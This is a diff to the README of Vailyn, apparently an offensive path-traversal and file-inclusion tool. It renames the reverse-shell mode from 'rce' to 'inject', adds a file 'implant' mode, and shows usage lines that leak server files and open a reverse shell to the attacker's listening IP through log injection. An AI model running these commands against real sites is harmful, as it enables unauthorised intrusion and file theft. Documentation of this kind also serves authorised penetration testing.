@@ -101,19 +101,20 @@ mandatory:
   -v VIC, --victim VIC  Target to attack, part 1 [pre-payload]
   -a INT, --attack INT  Attack type (int, 1-5, or A)
 
-    A|;  Spider (all)      3|:  Cookie
-    1|:  Query Parameter   4|;  POST Data, plain
-    2|;  Path              5|:  POST Data, json
+    A|  Spider (all)       2|  Path               5|  POST Data, json
+    P|  Spider (partial)   3|  Cookie
+    1|  Query Parameter    4|  POST Data, plain
 
   -p2 TP P1 P2, --phase2 TP P1 P2
                         Attack in Phase 2, and needed parameters
 
-┌[ Values ]────────┬────────────────┐
-│ TP   │ P1        │ P2             │
-├──────┼───────────┼────────────────┤
-│ leak │ File Dict │ Directory Dict │
-│ rce  │ IP Addr   │ Listening Port │
-└──────┴───────────┴────────────────┘
+┌[ Values ]─────────────┬────────────────────┐
+│ TP      │ P1          │ P2                 │
+├─────────┼─────────────┼────────────────────┤
+│ leak    │ File Dict   │ Directory Dict     │
+│ inject  │ IP Addr     │ Listening Port     │
+│ implant │ Source File │ Server Destination │
+└─────────┴─────────────┴────────────────────┘
 
 additional:
   -p PAM, --param PAM   query parameter or POST data for --attack 1, 4, 5
@@ -179,7 +180,7 @@ To perform the bruteforce attack, you need to specify `-p2 leak FIL PATH`, where
 * FIL is a dictionary file containing **filenames only** (e.g. index.php)
 * PATH, is a dictionary file containing **directory names only**. Vailyn will handle directory permutation for you, so you'll need only one directory per line.
 
-To gain a reverse shell, you can use `-p2 rce IP PORT`, where
+To gain a reverse shell by code injection, you can use `-p2 inject IP PORT`, where
 * IP is your listening IP
 * PORT is the port you want to listen on.
 
@@ -241,7 +242,7 @@ will infect DATA2 with the payload
 `$ Vailyn -v "http://site.com/" -a 1 -p2 leak dicts/files dicts/dirs -c "sessionid=foobar"`
 
 * Attack, but I want a reverse shell on port 1337:
-`$ Vailyn -v "http://site.com/download.php" -a 1 -p2 rce MY.IP.IS.XX 1337  # a high Phase 2 Depth is needed for log injection`
+`$ Vailyn -v "http://site.com/download.php" -a 1 -p2 inject MY.IP.IS.XX 1337  # a high Phase 2 Depth is needed for log injection`
 (will start a ncat listener for you if on Unix)
 
 * Full automation in crawler mode:
